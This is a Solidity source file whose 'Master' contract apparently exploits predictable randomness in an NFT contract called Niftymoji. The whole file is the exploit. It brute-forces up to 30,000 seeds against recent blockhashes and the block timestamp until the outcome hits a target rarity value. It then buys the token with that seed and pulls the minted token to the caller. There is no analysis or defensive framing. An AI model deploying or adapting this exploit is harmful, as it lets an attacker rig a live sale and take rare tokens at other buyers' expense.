pragma solidity =0.4.24;

contract Niftymoji {
	uint256 public totalSupply;
	function buyToken(uint256 _userSeed) public payable returns(bool);
	function transferFrom(address from, address to, uint256 tokenId) public;
	function ownerOf(uint256 tokenId) public view returns (address);
}

contract Master {
	Niftymoji public NiftymojiContract;
    constructor( address _target ) public {
		require( _target != address(0), "Target address is required" );
		NiftymojiContract = Niftymoji( _target );
    }
	
	function buyToken() public payable {	
		require( msg.value == 25000000000000000, 'Requires eth' );	
		uint256 seed = _find();
		if ( seed > 0 ) {
			NiftymojiContract.buyToken.value( 25000000000000000 )( seed );	
			uint256 tokenId = NiftymojiContract.totalSupply();	
			_pullToken( tokenId );	
		}
	}
	
	function _find() internal returns(uint256){
		uint256 _target = 99;
		for ( uint256 i = 1; i < 30000; i++ ){
			if ( 
				( ( uint256( keccak256(blockhash( block.number -1), i) ) % 100) == _target ) &&  
				( ( uint256( keccak256(blockhash( block.number -10), now, i) ) % 100 ) == _target )
			){
				return i;
			}
		}
		return 0;
	}
	
	function _pullToken( uint256 tokenId ) internal {
		NiftymojiContract.transferFrom(address(this), address( msg.sender ), tokenId);
		require( NiftymojiContract.ownerOf(tokenId) == address( msg.sender ) );
	}

	function () external payable {}    
}
